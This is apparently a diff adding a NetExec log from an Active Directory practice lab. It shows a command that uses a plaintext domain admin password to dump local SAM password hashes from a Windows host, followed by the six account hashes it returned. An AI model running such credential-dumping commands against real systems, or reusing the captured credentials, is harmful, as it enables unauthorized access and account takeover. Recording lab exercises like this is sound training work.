@@ -1,0 +1,12 @@
+[2026-10-19 14:25:17]> /home/kali/.local/bin/netexec smb 192.168.56.22 -u goadmin -p Wildf1re-Kn0ws -d north.sevenkingdoms.local --sam --log /home/kali/goad-captures-20261019/B-variants/nxc-sam.log --no-progress
+
+2026-10-19 14:25:17 | smb.py:326 - INFO - SMB                      192.168.56.22   445    castelblack      [*] Windows 10 / Server 2019 Build 17763 x64 (name:castelblack) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+2026-10-19 14:25:17 | smb.py:534 - INFO - SMB                      192.168.56.22   445    castelblack      [+] north.sevenkingdoms.local\goadmin:Wildf1re-Kn0ws (Pwn3d!)
+2026-10-19 14:25:18 | smb.py:2306 - INFO - SMB                      192.168.56.22   445    castelblack      [*] Dumping SAM hashes
+2026-10-19 14:25:18 | smb.py:2273 - INFO - SMB                      192.168.56.22   445    castelblack      goadmin:500:aad3b435b51404eeaad3b435b51404ee:d36be04781c5d4c2d467e59c302ecf30:::
+2026-10-19 14:25:18 | smb.py:2273 - INFO - SMB                      192.168.56.22   445    castelblack      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+2026-10-19 14:25:18 | smb.py:2273 - INFO - SMB                      192.168.56.22   445    castelblack      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+2026-10-19 14:25:18 | smb.py:2273 - INFO - SMB                      192.168.56.22   445    castelblack      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:dd898f444573caec7dae25fb10fb413b:::
+2026-10-19 14:25:18 | smb.py:2273 - INFO - SMB                      192.168.56.22   445    castelblack      ansible:1008:aad3b435b51404eeaad3b435b51404ee:d36be04781c5d4c2d467e59c302ecf30:::
+2026-10-19 14:25:18 | smb.py:2273 - INFO - SMB                      192.168.56.22   445    castelblack      Administrator:1009:aad3b435b51404eeaad3b435b51404ee:d36be04781c5d4c2d467e59c302ecf30:::
+2026-10-19 14:25:18 | smb.py:2310 - INFO - SMB                      192.168.56.22   445    castelblack      [+] Added 6 SAM hashes to the database
